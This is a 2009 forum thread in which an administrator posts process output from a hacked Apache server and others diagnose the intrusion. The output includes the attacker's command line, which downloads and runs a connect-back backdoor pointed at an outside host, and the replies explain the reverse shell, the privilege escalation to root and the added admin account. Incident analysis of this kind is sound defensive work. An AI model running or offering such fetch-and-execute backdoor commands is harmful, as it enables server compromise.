---
title: "Apache got hacked. Need help"
date: 2009-09-07
forum: Security
---

### Post by alimovz on 2009-09-07
Ok here is a snippet of my **ps -AH x**

```
[B]root      8769  0.0  0.3 201012 11508 ?        Ss   Jul22  12:18   /usr/sbin/apache2 -k start
www-data 12996  0.0  0.2 201148  7504 ?        S    Sep03   0:00     /usr/sbin/apache2 -k start
www-data 13294  0.0  0.0   3944   564 ?        S    Sep03   0:00       sh -c cd /dev/shm;wget sip.geostarcom.com/phpmyadmin/cb.txt;perl cb.txt thor.weru.ksu.edu 8080[/B]
www-data 13296  0.0  0.0  25404  2740 ?        S    Sep03   0:00         perl cb.txt thor.weru.ksu.edu 8080
www-data 13297  0.0  0.0   3944   572 ?        S    Sep03   0:00           sh -c echo "`uname -a`";echo "`id`";/bin/sh
www-data 13300  0.0  0.0   3944   580 ?        S    Sep03   0:00             /bin/sh
www-data 13700  0.0  0.0   3944   564 ?        S    Sep03   0:00               sh
www-data 13703  0.0  0.0   3944   560 ?        S    Sep03   0:00                 sh
www-data 14061  0.0  0.0   3944   572 ?        S    Sep03   0:00                   sh
www-data 14153  0.0  0.0   3944   596 ?        S    Sep03   0:00                     sh
www-data 14189  0.0  0.0   3944   572 ?        S    Sep03   0:00                       sh
www-data 15627  0.0  0.0   3944   564 ?        S    Sep03   0:00                         sh
www-data 15640  0.0  0.0   3944   564 ?        S    Sep03   0:00                           sh
root     15645  0.0  0.0   3944   564 ?        S    Sep03   0:00                             sh
root     15648  0.0  0.0  31260  1164 ?        S    Sep03   0:00                               su root
root     15649  0.0  0.0  10168  1328 ?        S    Sep03   0:00                                 bash
root     15805 13.2  0.1  37704  5532 ?        R    Sep03 669:21                                   adduser
root     15808  0.0  0.0      0     0 ?        Z    Sep03   0:00                                     [sh] <defunct>
www-data 18464  0.0  0.2 201012  6216 ?        S    01:25   0:00     /usr/sbin/apache2 -k start
www-data  9357  0.0  0.2 201152  7388 ?        S    01:26   0:00     /usr/sbin/apache2 -k start
www-data 23248  0.0  0.2 201152  7388 ?        S    01:27   0:00     /usr/sbin/apache2 -k start
www-data 24479  0.0  0.2 201144  7392 ?        S    01:27   0:00     /usr/sbin/apache2 -k start
www-data  5511  0.0  0.2 203368  8844 ?        S    01:27   0:00     /usr/sbin/apache2 -k start
www-data 24802  0.0  0.2 201012  6268 ?        S    01:28   0:00     /usr/sbin/apache2 -k start
www-data 22050  0.0  0.2 201152  7440 ?        S    01:30   0:00     /usr/sbin/apache2 -k start
www-data 22356  0.0  0.2 201152  7376 ?        S    01:30   0:00     /usr/sbin/apache2 -k start
www-data 13247  0.0  0.2 201144  7400 ?        S    01:31   0:00     /usr/sbin/apache2 -k start
www-data 13248  0.0  0.2 201012  6220 ?        S    01:31   0:00     /usr/sbin/apache2 -k start
www-data 13559  0.0  0.2 203224  8808 ?        S    01:31   0:00     /usr/sbin/apache2 -k start
www-data 13561  0.0  0.2 201012  6216 ?        S    01:31   0:00     /usr/sbin/apache2 -k start
www-data 13562  0.0  0.2 201144  7380 ?        S    01:31   0:00     /usr/sbin/apache2 -k start
www-data 27328  0.0  0.2 201012  6252 ?        S    01:32   0:00     /usr/sbin/apache2 -k start
www-data 27635  0.0  0.2 201152  7364 ?        S    01:32   0:00     /usr/sbin/apache2 -k start

```

Take a look at the bold lines in the snippet. Process 8769 simply forks a bunch of apache2 processes like (12996, 18464, 9357, 23248 etc.). Apache runs in prefork for what it's worth:

```
<IfModule mpm_prefork_module>
    StartServers          5
    MinSpareServers       5
    MaxSpareServers      10
    MaxClients          150
    MaxRequestsPerChild   0
</IfModule>
```

My question is how the hell is process 12996 forking process 13294. In other words how is that apache process able to run that sh command?

I would appreciate any clues.


Thank you.

---

### Post by bobince on 2009-09-07
Presumably an insecure webapp script has a command-line-injection hole. Check your access logs and update or remove any (eg. PHP) apps you have.

---

### Post by JohnPta on 2009-09-07
> **bobince said:**
> Presumably an insecure webapp script has a command-line-injection hole. Check your access logs and update or remove any (eg. PHP) apps you have.

I think I have the same problem. But what is a PHP application? Can I just delete it? Or must I "uninstall" it?

---

### Post by denver on 2009-09-07
Well...that looks preety bad. Seems its a connect backdoor. The worrying thing is that the attacker managed to get root access somehow.

PHP is a server side scripting language used for creating dynamic websites. 

You might be better of reinstalling your system. Make sure you always upgrade. Also, if you don't need CGI access or the exec() function in PHP you might be better of disabling them.

If its a shared hosting system, make sure you jail your users (including www-data). If you are not the server administrator or have limited experience administering webservers, you might want to seek the advice of a professional system administrator.

---

### Post by phillw on 2009-09-07
I **really** do NOT like the look of the line

```

print "mofo's Connect Back Backdoor\n\n";


```In the script.

It 'seems, in your case, to be attempting to gain access to a  site by the name of  thor.weru.ksu.edu on port 8080, but I don't know  about scripting so as to understand what the whole file does.


It downloads itself into memory, I guess so as not to leave a trail.

I can only surmise that it does what the print bit says.

---

### Post by bobince on 2009-09-08
Oh yes, you've been totally owned, that goes without saying. You definitely should completely reinstall the OS. But you'll still want to find out how they got in, so it doesn't just happen again.

The www-data user was persuaded to execute the rogue command somehow (a PHP application called a system command without checking its parameter properly, perhaps?) then that command downloaded and ran a small script which starts a bash shell and connects its input and output to a pipe to a remote server, so the attacker on that server can execute whatever commands they like.

The attacker then escalates his access from www-data to root using another exploit of some kind. We can't see from the process tree, but it could be a kernel local-root-escalation vulnerability if you haven't been keeping your server up-to-date, or it could be a bad setuid script, or maybe even your root password is guessable!

Once root the attacker adds a new user for themselves, presumably an alternative administrator account they can use through SSH without having to go through the server's shell-pipe.

---

